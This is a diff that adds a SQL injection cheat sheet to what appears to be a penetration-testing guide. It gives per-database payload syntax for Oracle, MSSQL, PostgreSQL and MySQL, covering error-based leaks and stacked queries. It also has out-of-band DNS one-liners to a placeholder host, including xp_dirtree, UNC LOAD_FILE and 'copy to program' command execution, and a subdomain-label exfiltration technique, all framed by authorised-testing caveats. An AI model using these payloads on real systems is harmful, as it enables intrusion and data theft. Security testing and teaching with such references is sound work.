@@ -367,3 +367,30 @@ File-import rows (CSV/XLSX) re-queried server-side · webhook/callback payloads 
 ```
 Confirm a candidate first (error/boolean/time/OOB canary), then extract read-only and minimal. Tooling:
 `sqlmap -r req.txt --batch --risk=1 --technique=BEUST --dbms=<DBMS>` — verify MANUALLY, never dump real PII.
+
+## Extended arsenal — per-DBMS quick-reference matrix   (read-only confirm first · OOB = benign canary · stacked/OOB-exfil approval-gated)
+
+One lookup once `@@version`/`v$version` names the engine. Time-delay syntax is in the matrix above — this
+adds the operations NOT already tabled. `<OOB-HOST>` = your collaborator/OOB domain; `<c>` = a boolean condition.
+
+| operation | Oracle | MSSQL | PostgreSQL | MySQL |
+|---|---|---|---|---|
+| string concat | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a' 'b'` / `CONCAT('a','b')` |
+| substring (1-based) | `SUBSTR(s,4,2)` | `SUBSTRING(s,4,2)` | `SUBSTRING(s,4,2)` | `SUBSTRING(s,4,2)` |
+| comment | `--` | `--` `/* */` | `--` `/* */` | `# ` / `-- ` (space) / `/* */` |
+| version | `SELECT banner FROM v$version` | `@@version` | `version()` | `@@version` |
+| list tables | `all_tables` | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` |
+| list columns | `all_tab_columns WHERE table_name='T'` | `information_schema.columns WHERE table_name='T'` | (same) | (same) |
+| conditional error | `CASE WHEN(<c>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` | `CASE WHEN(<c>) THEN 1/0 ELSE NULL END` | `1=(CASE WHEN(<c>) THEN 1/(SELECT 0) ELSE NULL END)` | `IF(<c>,(SELECT table_name FROM information_schema.tables),'a')` |
+| visible-error leak | — | `1=(SELECT 'secret')` conversion err | `CAST((SELECT secret) AS int)` | `EXTRACTVALUE(1,CONCAT(0x5c,(SELECT 'secret')))` |
+| stacked queries | not supported | `; Q2` | `; Q2` | `; Q2` (driver-dependent) |
+
+### OOB DNS one-liners (benign reachability canary to `<OOB-HOST>`; data-exfil variants approval-gated)
+```
+Oracle (unpatched) : XMLType entity XXE -> http://<OOB-HOST>/     (patched: UTL_INADDR.get_host_address('<OOB-HOST>') needs priv)
+MSSQL              : '; EXEC master..xp_dirtree '//<OOB-HOST>/a'-- -
+PostgreSQL         : copy (SELECT '') to program 'nslookup <OOB-HOST>'     (superuser; RCE-adjacent -> approval)
+MySQL (Windows)    : SELECT LOAD_FILE('\\\\<OOB-HOST>\\a')  /  ... INTO OUTFILE '\\\\<OOB-HOST>\\a'   (needs FILE priv)
+```
+Exfil form: splice `(SELECT <read-only-query>)` into the subdomain label, confirm the attributable hit, then
+STOP — never iterate real PII through DNS.
